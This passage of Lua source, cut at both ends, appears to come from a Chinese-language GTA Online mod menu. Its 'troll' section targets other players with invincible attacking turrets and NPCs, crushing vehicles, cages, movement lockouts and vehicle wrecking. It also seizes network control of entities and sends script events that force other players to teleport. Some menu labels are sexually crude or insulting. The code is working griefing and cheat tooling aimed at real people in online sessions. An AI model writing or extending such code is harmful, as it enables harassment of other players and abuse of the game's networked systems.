    peddd = CreatePed(28, ped_hash, offset, math.random(270))
    ENTITY.SET_ENTITY_INVINCIBLE(turret, true)
    ENTITY.SET_ENTITY_INVINCIBLE(peddd, true)
    PED.SET_PED_INTO_VEHICLE(peddd, turret, -1)
    PED.SET_PED_ACCURACY(peddd, 100.0)
    PED.SET_PED_COMBAT_RANGE(peddd, 3)
    TASK.TASK_COMBAT_PED(peddd, tar_ped, 0, 16)
    PED.SET_PED_SHOOT_RATE(peddd, 0)
    TASK.TASK_VEHICLE_SHOOT_AT_PED(peddd, tar_ped, 100.0)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(peddd, true)
    util.create_thread(function()
        while true do
            local tar_coords = ENTITY.GET_ENTITY_COORDS(tar_ped, true)
            local veh_coords = ENTITY.GET_ENTITY_COORDS(turret, true)
            local distance = v3.distance(veh_coords, tar_coords)
            if distance > 20.0 then
                offset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(tar_ped, 0.0, -10.0, 0.0)
                success, new_z = util.get_ground_z(offset.x, offset.y, offset.z)
                if success then
                    offset.z = new_z
                    ENTITY.SET_ENTITY_COORDS(turret, offset.x, offset.y, offset.z, false, false, false, true)
                end
            end
            wait()
        end
    end)
end)
GTAC(updatetroll, "炮塔攻击", {}, "跟随目标.", function()
    local veh_hash = util.joaat("trailersmall2")
    local ped_hash = util.joaat('a_m_o_tramp_01')
    request_model(veh_hash, 2000)
    request_model(ped_hash, 2000)
    local tar_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local offset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(tar_ped, 0.0, -10.0, 0.0)
    local success, new_z
    success = false
    local tries = 0
    while not success do
        if tries > 10 then
            break
        end
        tries = tries + 1
        success, new_z = util.get_ground_z(offset.x, offset.y, offset.z)
        if success then 
            offset.z = new_z
            break
        end
        wait()
    end
    turret = spawn_vehicle(veh_hash, offset, math.random(270))
    peddd = CreatePed(28, ped_hash, offset, math.random(270))
    ENTITY.SET_ENTITY_INVINCIBLE(turret, true)
    ENTITY.SET_ENTITY_INVINCIBLE(peddd, true)
    PED.SET_PED_INTO_VEHICLE(peddd, turret, -1)
    PED.SET_PED_ACCURACY(peddd, 100.0)
    PED.SET_PED_COMBAT_RANGE(peddd, 3)
    TASK.TASK_COMBAT_PED(peddd, tar_ped, 0, 16)
    PED.SET_PED_SHOOT_RATE(peddd, 0)
    TASK.TASK_VEHICLE_SHOOT_AT_PED(peddd, tar_ped, 100.0)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(peddd, true)
    util.create_thread(function()
        VEHICLE.SET_VEHICLE_MOD(turret, 10, 1)
        while true do
            local tar_coords = ENTITY.GET_ENTITY_COORDS(tar_ped, true)
            local veh_coords = ENTITY.GET_ENTITY_COORDS(turret, true)
            local distance = v3.distance(veh_coords, tar_coords)
            if distance > 20.0 then
                offset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(tar_ped, 0.0, -10.0, 0.0)
                success, new_z = util.get_ground_z(offset.x, offset.y, offset.z)
                if success then
                    offset.z = new_z
                    ENTITY.SET_ENTITY_COORDS(turret, offset.x, offset.y, offset.z, false, false, false, true)
                end
            end
            wait()
        end
    end)
end)
GTTG(updatetroll,"性爱笼子", {}, "自动跟踪玩家", function(on)
    if on then
        monitoring = true
        create_npc_circle(pid)
        monitor_player(pid)
    else
        monitoring = false
        wait()
        delete_npcs()
    end
end)
GTAC(updatetroll,"鲸鱼吃人", {}, "", function()
    jingyuchiren(pid)
end)
GTLP(updatetroll,"载具惩罚", {}, "附近载具遭到惩罚", function()
    local playerPed = PLAYER.GET_PLAYER_PED(players.user())
    local vehhh = PED.GET_VEHICLE_PED_IS_IN(playerPed, true)
    local nearby_vehiclesFALL = get_ped_nearby_vehicles(playerPed, 100)
    for _, vehhx in pairs(nearby_vehiclesFALL) do 
        if vehhx ~= vehhh then
            local CarCrushLocation = math.random(1, 25)
            local CarCrushRadius = math.random(1, 500)
            local damagePower = 111150000
            local coords = {
                {0, CarCrushLocation, 0},
                {0, -CarCrushLocation, 0},
                {-CarCrushLocation, 0, 0},
                {CarCrushLocation, 0, 0},
                {0, 0, -CarCrushLocation},
                {0, 0, CarCrushLocation}
            }
            for _, coord in ipairs(coords) do
                VEHICLE.SET_VEHICLE_DAMAGE(vehhx, coord[1], coord[2], coord[3], -damagePower, CarCrushRadius, true)
                VEHICLE.SET_VEHICLE_DAMAGE(vehhx, coord[1], coord[2], coord[3], damagePower, CarCrushRadius, true)
            end
            VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(vehhx, false, true)
            local speed = ENTITY.GET_ENTITY_SPEED(vehhx)
            ENTITY.SET_ENTITY_VELOCITY(vehhx, 0, 0, 5)
            for pop = 0, 7 do
                local mathcalc = math.random(1000.0, 2000.0)
                VEHICLE.SET_VEHICLE_TYRE_BURST(vehhx, pop, true, mathcalc)
            end
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehhx, speed + 2)
        end
    end
end)
GTTG(updatetroll,"球形笼子", {}, "花园银行的球", function(on_toggle)
    if on_toggle then
        spherehash = util.joaat("ar_prop_ar_neon_gate4x_04a")
        request_model(spherehash)
        entity_handles = {}
        base_pos = players.get_position(pid)
        base_pos.z = base_pos.z + 95
        for i = 1, 19 do
            sphere = entities.create_object(spherehash, base_pos)
            ENTITY.FREEZE_ENTITY_POSITION(sphere, true)
            ENTITY.SET_ENTITY_ROTATION(sphere, 0.0, 0.0, i * 10.0, 1, true)
            table.insert(entity_handles, sphere)
        end
    else
        for _, handle in ipairs(entity_handles) do
            entities.delete_by_handle(handle)
        end
    end
end)
GTLP(updatetroll, "电死他", {""}, "拯救网瘾少年", function(pid)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    for i = 1, 50 do
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end
    wait()
end)
function is_ped_using_vehicle(Ped, Vehicle)
    local vhcl_ped_using <const> = PED.GET_VEHICLE_PED_IS_USING(Ped)
    local vhcl_ped_entering <const> = PED.GET_VEHICLE_PED_IS_ENTERING(Ped)
    return vhcl_ped_using == Vehicle or vhcl_ped_entering == Vehicle
end
function is_ped_using_any_vehicle(Ped)
    local vhcl_ped_using <const> = PED.GET_VEHICLE_PED_IS_USING(Ped)
    local vhcl_ped_entering <const> = PED.GET_VEHICLE_PED_IS_ENTERING(Ped)
    return ENTITY.DOES_ENTITY_EXIST(vhcl_ped_using) or ENTITY.DOES_ENTITY_EXIST(vhcl_ped_entering)
end
GTTG(updatetroll, '玩家磁场混乱', {}, '', function(f9)
    fon9 = f9
    while fon9 do
        for i, ent in pairs(entities.get_all_peds_as_handles()) do
            if not PED.IS_PED_A_PLAYER(ent) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
                if entities.get_owner(ent) == players.user() then
                    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent), false)
                    if is_ped_using_any_vehicle(ent) then
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ent)
                    end
                    local NewOffset<const> = v3.sub(ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)),
                        ENTITY.GET_ENTITY_COORDS(ent))
                    ENTITY.APPLY_FORCE_TO_ENTITY(ent, 1, NewOffset.x * 500, NewOffset.y * 500, NewOffset.z * 500, 0, 0,
                        0, false, true)
                end
            end
        end
        for i, entveh in pairs(entities.get_all_vehicles_as_handles()) do
            for pid in players.list(false, true, true) do
                if is_ped_using_vehicle(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), entveh) then
                    goto Magnet_Continue
                end
            end
            if entities.get_owner(entveh) == players.user() then
                entity_owner_can_migrate(entveh, false)
                ENTITY.SET_ENTITY_ROTATION(entveh, math.random(0, 360), math.random(0, 360), math.random(0, 360))
                local NewOffset<const> = v3.sub(ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)),
                    ENTITY.GET_ENTITY_COORDS(entveh))
                ENTITY.APPLY_FORCE_TO_ENTITY(entveh, 1, NewOffset.x * 500, NewOffset.y * 500, NewOffset.z * 500, 0, 0,
                    0, false, true)
            else
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entveh)
            end
            ::Magnet_Continue::
        end
        wait(250)
    end
    if not fon9 then
        for i, entped in pairs(entities.get_all_peds_as_handles()) do
            entity_owner_can_migrate(entped, true)
            ENTITY.SET_ENTITY_INVINCIBLE(entped, false)
        end
        for i, entveh in pairs(entities.get_all_vehicles_as_handles()) do
            entity_owner_can_migrate(entveh, true)
        end
    end
end)
GTTG(updatetroll, '神出鬼没声', {}, '', function(f2)
    fon2 = f2
    local Spam_PTFX<const> = {}
    if fon2 then
        for i = 1, 30 do
            local pos1<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            Spam_PTFX[i] = entityspawn_entity(joaat("xs_prop_arena_oil_jack_01a"),
                v3.new(pos1.x + 75, pos1.y, pos1.z + 75), math.random(0, 360), false, true, true, true, false)
            ENTITY.SET_ENTITY_ROTATION(Spam_PTFX[i], math.random(0, 360), math.random(0, 360), math.random(0, 360))
            ENTITY.SET_ENTITY_VISIBLE(Spam_PTFX[i], 0)
            for i in ipairs(Spam_PTFX) do
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Spam_PTFX[i], pos1.x + 75, pos1.y, pos1.z + 75)
            end
            wait(100)
        end
    end
    while fon2 do
        local pos1<const> = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0.0,
            0.0, -2.0)
        for i in ipairs(Spam_PTFX) do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Spam_PTFX[i], pos1.x, pos1.y, pos1.z)
            ENTITY.SET_ENTITY_ROTATION(Spam_PTFX[i], math.random(0, 360), math.random(0, 360), math.random(0, 360))
        end
        wait()
    end
    if not fon2 then
        for i in ipairs(Spam_PTFX) do
            entitydelete_entity(Spam_PTFX[i])
        end
    end
end)
GTTG(updatetroll,'禁用行走和武器',{},'',function(f16)
    fon16 = f16
    while fon16 do
        for i, ent in pairs(entities.get_all_vehicles_as_handles()) do
            TASK.TASK_VEHICLE_TEMP_ACTION(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), ent, -1, 1000)
        end
        wait()
    end
    fon16 = false
end)
GTTG(updatetroll, '禁用跳跃和攀登',{},'',function(f17)
    fon17 = f17
    if fon17 then
        local pos1 <const> = ENTITY.GET_ENTITY_COORDS(
            PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        DisableJumpVeh = entityspawn_entity(joaat("dump"), v3.new(pos1.x, pos1.y, pos1.z), 
        ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)), 
        false, true, false, true, false)
    end
    while fon17 do
        local pos1 <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(DisableJumpVeh, pos1.x, pos1.y, pos1.z)
        ENTITY.SET_ENTITY_ROTATION(DisableJumpVeh, 0, 0, ENTITY.GET_ENTITY_HEADING(
            PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        if entities.get_owner(DisableJumpVeh) ~= players.user() then
            gtoast("发生错误,如果问题仍然存在,请更改战局.")
            fon17n = false
        end
        wait()
    end
    if not fon17 then
        entitydelete_entity(DisableJumpVeh)
    end
end)
GTAC(updatetroll, '禁用炮弹',{},'',function()
    for i = 1, 5 do
        local pos1 <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for i = 1, 60 do
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(players.user_ped(), joaat("WEAPON_BALL"), 0, false)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos1.x, pos1.y, pos1.z, pos1.x, pos1.y, pos1.z + 5, 0,
            true, joaat("WEAPON_BALL"), players.user_ped(), false, true, 0)
        end
        wait(500)
            MISC.CLEAR_AREA_OF_PROJECTILES(ENTITY.GET_ENTITY_COORDS(players.user_ped()).x, 
            ENTITY.GET_ENTITY_COORDS(players.user_ped()).y,ENTITY.GET_ENTITY_COORDS(players.user_ped()).z,400, 0)
        wait(100)
    end
end)
GTTG(updatetroll, '午夜DJ', {}, '需要等待五秒左右', function(f3)
    fon3 = f3
    local Disco_Light<const> = {}
    if fon3 then
        for i = 1, 30 do
            local pos1<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            Disco_Light[i] = entityspawn_entity(joaat("prop_spot_01"), v3.new(pos1.x + 75, pos1.y, pos1.z + 75), 0,
                false, true, true, true, false)
            ENTITY.SET_ENTITY_ROTATION(Disco_Light[i], math.random(0, 360), math.random(0, 360), math.random(0, 360))
            for i in ipairs(Disco_Light) do
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Disco_Light[i], pos1.x + 75, pos1.y, pos1.z + 75)
            end
            wait(100)
        end
    end
    while fon3 do
        local pos1<const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for i in ipairs(Disco_Light) do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Disco_Light[i], pos1.x, pos1.y, pos1.z + 1.5)
            ENTITY.SET_ENTITY_ROTATION(Disco_Light[i], math.random(0, 360), math.random(0, 360), math.random(0, 360))
        end
        wait()
    end
    if not fon3 then
        for i in ipairs(Disco_Light) do
            entitydelete_entity(Disco_Light[i])
        end
    end
end)
GTTG(updatetroll, '附加垃圾车',{},'需要等待五秒左右\n尽量远离目标,因为具有无比响亮的噪声',function(f)
    fon = f
    local Horn_Car <const> = {}
    if fon then
        for i = 1, 30 do
            local pos1 <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            Horn_Car[i] = entityspawn_entity(joaat("t20"), v3.new(pos1.x + 110, pos1.y, 2600),
            math.random(0, 360), false, true, true, true, false)
            VEHICLE.SET_VEHICLE_MOD(Horn_Car[i], 14, 16)
            for i in ipairs(Horn_Car) do
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Horn_Car[i], pos1.x + 110, pos1.y, 2600)
            end
            wait(100)
        end
    end
    while fon do
        for i in ipairs(Horn_Car) do
            local pos1 <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Horn_Car[i], pos1.x, pos1.y, pos1.z + 1.5)
            VEHICLE.SET_VEHICLE_ALARM(Horn_Car[i], true)
            VEHICLE.START_VEHICLE_ALARM(Horn_Car[i])
        end
        wait()
    end
    if not fon then
        for i in ipairs(Horn_Car) do
            entitydelete_entity(Horn_Car[i])
        end
    end
end)
GTLP(updatetroll, '压杀1', {}, '大多菜单阻止', function()
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerPos = ENTITY.GET_ENTITY_COORDS(playerPed)
    local playerHeading = ENTITY.GET_ENTITY_HEADING(playerPed)
    yasha1(pid, util.joaat("khanjali"), playerPos, playerHeading)
end)
GTLP(updatetroll, '压杀2', {}, '大多菜单阻止', function()
    yasha2(pid, util.joaat("prop_roofvent_06a"))
end)
GTTG(updatetroll, '压杀3', {}, '', function(f5)
    fon5 = f5
    if fon5 then
        local pos1<const> = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0.0,
            3.0, 0.0)
        crush_ent = entityspawn_entity(joaat("BUS"), v3.new(pos1.x, pos1.y, ENTITY.GET_ENTITY_COORDS(
            PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)).z + 100),
            ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)), false, true, true, false, true)
        ENTITY.SET_ENTITY_HAS_GRAVITY(crush_ent, false)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(crush_ent, true)
        entities.set_can_migrate(crush_ent, 0)
    end
    while fon5 do
        local pos1<const> = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0.0,
            3.0, 0.0)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(crush_ent, pos1.x, pos1.y,
            ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)).z + 5)
        ENTITY.SET_ENTITY_ROTATION(crush_ent, 0, 0, ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        wait(250)
        ENTITY.APPLY_FORCE_TO_ENTITY(crush_ent, 1, 0, 0, -25, 0, 0, 0, false, true)
        wait(1000)
        if entities.get_owner(crush_ent) ~= players.user() then
            gtoast("发生错误,如果问题仍然存在,请更改战局.")
            fon5 = false
        end
    end
    if not fon5 then
        entitydelete_entity(crush_ent)
    end
end)
GTAC(updatetroll, '传送位置故障', {},'',function()
    local teleportLocations = {
        {403.78, -961.35, -99.00},
        {135.9541, -749.8984, 258.1520},
        {459.414, -980.884, 30.690},
        {126.1211, -1278.5130, 29.2696},
        {-91.6870, 33.0948, 71.4655},
        {-1244.379, -1454.591, 4.348},
        {-254.9432, -147.3534, 42.7314},
        {928.937, 41.536, 85.995},
        {-1907.3500, -577.2352, 20.1223},
        {721.6599, -1000.6510, 23.5455}
    }
    local function teleportPlayerToLocation(location)
    local meped = players.user_ped()
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(meped, location[1], location[2], location[3], 
        false, true, true)
        util.yield(100) 
        menu.trigger_commands("summon" .. PLAYER.GET_PLAYER_NAME(pid)) 
        util.yield(500) 
    end
    local startcoords = players.get_position(players.user_ped())
        for _, location in ipairs(teleportLocations) do
        teleportPlayerToLocation(location)
    end
end)
GTAC(updatetroll, '打破玩家物理平衡', {}, '', function()
    local playerVehicle = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local models = {1074457665, 916292624}
    for _, model in ipairs(models) do
        STREAMING.REQUEST_MODEL(model)
        while not STREAMING.HAS_MODEL_LOADED(model) do
            util.yield(0)
        end
    end
    local playerPos = players.get_position(pid)
    local pedId = entities.create_ped(4, models[1], playerPos, 0)
    local obj = entities.create_object(models[2], playerPos)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, pedId, 0, 0, 0, 0, 0, 0, 0, false, true, false, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(pedId, playerVehicle, 0, 0, 0, 0, 0, 0, 0, false, true, false, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(pedId, false)
    ENTITY.SET_ENTITY_VISIBLE(obj, false)
    ENTITY.SET_ENTITY_COLLISION(pedId, true)
    ENTITY.SET_ENTITY_COLLISION(obj, true)
end)
GTTG(updatetroll, '视觉痉挛', {}, '', function(ft)
    local x = ft
    if x then
        spawnedObjects = deleteEntities(spawnedObjects)
        spawnedVehicles = deleteEntities(spawnedVehicles)
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerCoords = players.get_position(playerPed)
        request_ptfx_asset("scr_indep_fireworks")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_indep_firework_trail_spawn", playerCoords.x,
            playerCoords.y, playerCoords.z, 0, 0, 0, 1.0, true, true, true)
        local objectHashes = {util.joaat("prop_xmas_ext"), util.joaat("prop_food_van_01")}
        for _, hash in ipairs(objectHashes) do
            local obj = createAndAttachObject(hash, playerCoords, playerPed)
            table.insert(spawnedObjects, obj)
        end
        spawnAndDeleteVehicles(0x810369E2, playerCoords, 25)
    else
        spawnedObjects = deleteEntities(spawnedObjects)
        spawnedVehicles = deleteEntities(spawnedVehicles)
    end
    return HANDLER_CONTINUE
end)
GTLP(updatetroll,'隐形爬楼梯',{},'',function()
    local coords = ENTITY.GET_ENTITY_COORDS(
        PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local cageCoords = 
    v3.new(coords.x, coords.y, coords.z - 0.5)
    STREAMING.REQUEST_MODEL(util.joaat(
        "prop_towercrane_02e"))
    while not STREAMING.HAS_MODEL_LOADED(
        util.joaat("prop_towercrane_02e")) do
        util.yield(25)
    end
    local player_heading = ENTITY.GET_ENTITY_HEADING(
        PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) 
    local offset_forward = 0
    local offset_right = 0.0 
    local offset_up = -0.5 
    local forward_x, forward_y = 
    get_forward_vector_from_heading(player_heading)
    local right_x, right_y = forward_y, -forward_x 
    local new_x = cageCoords.x + forward_x * 
    offset_forward + right_x * offset_right
    local new_y = cageCoords.y + forward_y * 
    offset_forward + right_y * offset_right
    local new_z = cageCoords.z + offset_up
    cageobjecttest = OBJECT.CREATE_OBJECT(
        util.joaat("prop_towercrane_02e"), 
    new_x, new_y, new_z, true,true, false)
    ENTITY.SET_ENTITY_HEADING(cageobjecttest, player_heading)
    ENTITY.SET_ENTITY_COLLISION(cageobjecttest, true)
    ENTITY.SET_ENTITY_VISIBLE(cageobjecttest, false)
    util.yield(1500)
end)
GTTG(updatetroll,"载具跳舞", {}, "使对方车辆一直弹跳", function(tw)
    tiaowu=tw
        while tiaowu do
            request_control(PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            local vehicle_velocity = ENTITY.GET_ENTITY_VELOCITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            ENTITY.SET_ENTITY_VELOCITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)),vehicle_velocity.x, vehicle_velocity.y, vehicle_velocity.z + 3.5)
            wait(1000)
        end
    tiaowu=false
end)
function hongzhaji()
    weapon_Type = {{"烟花", "weapon_firework"}, {"原子能枪", "weapon_raypistol"},
                   {"邪恶冥王", "weapon_raycarbine"}, {"电磁步枪", "weapon_railgun"},
                   {"红色激光", "vehicle_weapon_enemy_laser"}, {"绿色激光", "vehicle_weapon_player_laser"},
                   {"天煞机炮", "vehicle_weapon_player_lazer"}, {"火箭炮", "weapon_rpg"},
                   {"制导火箭发射器", "weapon_hominglauncher"},
                   {"紧凑型电磁脉冲发射器", "weapon_emplauncher"}, {"信号弹", "weapon_flaregun"},
                   {"霰弹枪", "weapon_bullpupshotgun"}, {"电击枪", "weapon_stungun"},
                   {"催泪瓦斯", "weapon_smokegrenade"}}
    hongzha = GT(updatetroll, "轰炸机", {}, "各种武器轰炸")
    for id, data in pairs(weapon_Type) do
        local name = data[1]
        local weapon_name = data[2]
        GTLP(hongzha, name, {""}, "", function()
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 5, pos.x, pos.y, pos.z, 0, true,
                util.joaat(weapon_name), players.user_ped(), true, true, 0)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x - 1, pos.y, pos.z + 5, pos.x, pos.y, pos.z, 0, true,
                util.joaat(weapon_name), players.user_ped(), true, true, 0)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x + 1, pos.y, pos.z + 5, pos.x, pos.y, pos.z, 0, true,
                util.joaat(weapon_name), players.user_ped(), true, true, 0)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x - 2, pos.y, pos.z + 5, pos.x, pos.y, pos.z, 0, true,
                util.joaat(weapon_name), players.user_ped(), true, true, 0)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x + 3, pos.y, pos.z + 5, pos.x, pos.y, pos.z, 0, true,
                util.joaat(weapon_name), players.user_ped(), true, true, 0)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x - 4, pos.y, pos.z + 5, pos.x, pos.y, pos.z, 0, true,
                util.joaat(weapon_name), players.user_ped(), true, true, 0)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x + 4, pos.y, pos.z + 5, pos.x, pos.y, pos.z, 0, true,
                util.joaat(weapon_name), players.user_ped(), true, true, 0)
        end)
    end
end
hongzhaji()
local tp_timer2 = 0
updatetroll:action("传送到佩里科岛", {}, "目标需要拥有一个CEO组织", function()
    menu.trigger_commands($"ceojoin {players.get_name(pid)} on")
    repeat
        if tp_timer2 > 10 then
            return
        end
        tp_timer2 += 1
        wait(1000)
    until players.get_boss(players.user()) != -1
    local pos = players.get_position(players.user())
    local player_pos = players.get_position(pid)
    ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false)
    wait(100)
    for i   = 0, 10 do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), player_pos.x, player_pos.y, player_pos.z, false, false, false)
        util.trigger_script_event(1 << pid, {1669592503, players.user(), 0, 0, 3, 1})
        wait(100)
    end
    ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos.x, pos.y, pos.z, false, false, false)
    menu.trigger_commands($"ceojoin {players.get_name(pid)} off")
end)
local tp_timer3 = 0
updatetroll:action("传送到海滩", {}, "目标需要拥有一个CEO组织", function()
    menu.trigger_commands($"ceojoin {players.get_name(pid)} on") 
    repeat
        if tp_timer3 > 10 then
            return
        end
        tp_timer3 += 1
        wait(1000)
    until players.get_boss(players.user()) != -1
    local pos = players.get_position(players.user())
    local player_pos = players.get_position(pid)
    ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false)
    wait(100)
    for i   = 0, 10 do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), player_pos.x, player_pos.y, player_pos.z, false, false, false)
        util.trigger_script_event(1 << pid, {1669592503, players.user(), 0, 0, 4, 0})
        wait(100)
    end
    ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos.x, pos.y, pos.z, false, false, false)
    menu.trigger_commands($"ceojoin {players.get_name(pid)} off")
end)
updatetroll:action('磁吸飞机', {}, '需要对方在车里!', function()
local p_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
     local target_v = PED.GET_VEHICLE_PED_IS_IN(p_ped, true)
     local c = players.get_position(pid)
c.z += 10
     if target_v == 0 then 
        notification('玩家不在车内',blak)
        return
     end
if detection_protection and players.is_marked_as_modder(pid) then 
     notification('此玩家无法吸住.',blak)
     return
end
local v_hash = util.joaat('cargobob2')
local p_hash = util.joaat('u_m_y_croupthief_01')
        util.request_model(v_hash, 2000)
        util.request_model(p_hash, 2000)
local veh = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(target_v))
local pilot = entities.create_ped(28, p_hash, c, 0.0)
    VEHICLE.SET_CARGOBOB_FORCE_DONT_DETACH_VEHICLE(veh, true)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(veh)
    VEHICLE.CREATE_PICK_UP_ROPE_FOR_CARGOBOB(veh, 1)
    PED.SET_PED_INTO_VEHICLE(pilot, veh, -1)    
    VEHICLE.SET_CARGOBOB_PICKUP_MAGNET_ENSURE_PICKUP_ENTITY_UPRIGHT(target_v, true)
    VEHICLE.SET_CARGOBOB_PICKUP_MAGNET_PULL_STRENGTH(veh, 1000.0)
    VEHICLE.SET_CARGOBOB_PICKUP_MAGNET_FALLOFF(veh, 1000.0)
request_control_of_entity(target_v)
    ENTITY.SET_ENTITY_INVINCIBLE(target_v, true)
    VEHICLE.SET_VEHICLE_GRAVITY(target_v, false)
local v = ENTITY.GET_ENTITY_VELOCITY(target_v)
    ENTITY.SET_ENTITY_VELOCITY(veh, 0, 0, 60.0)
    VEHICLE.ATTACH_VEHICLE_TO_CARGOBOB(veh, target_v, 0, 0.0, 0.0, 5.0)
    ENTITY.SET_ENTITY_ANGULAR_VELOCITY(target_v, 0, 0, 0)
    TASK.TASK_HELI_MISSION(pilot, veh, 0, 0, math.random(1000), math.random(1000), 300, 4, 200.0, 0.0, 0, 100, 1000, 0.0, 16)
    VEHICLE.SET_HELI_TURBULENCE_SCALAR(veh, 0.0)
end)
--
GTAC(updatetroll, "被狗强奸的NPC", {}, "",topless)
GTAC(updatetroll, "标记为傻逼", {}, "",biaoji)
GTTG(updatetroll, '背背佳', {"nightvision"}, '', function (on)
if on then
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, -0.058, 0.197, 0.595, 2.0, 1.0,1, true, true, true, false, 0, true)
    ped = players.user_ped()
    while not STREAMING.HAS_ANIM_DICT_LOADED("anim@heists@heist_safehouse_intro@phone_couch@male") do
        STREAMING.REQUEST_ANIM_DICT("anim@heists@heist_safehouse_intro@phone_couch@male")
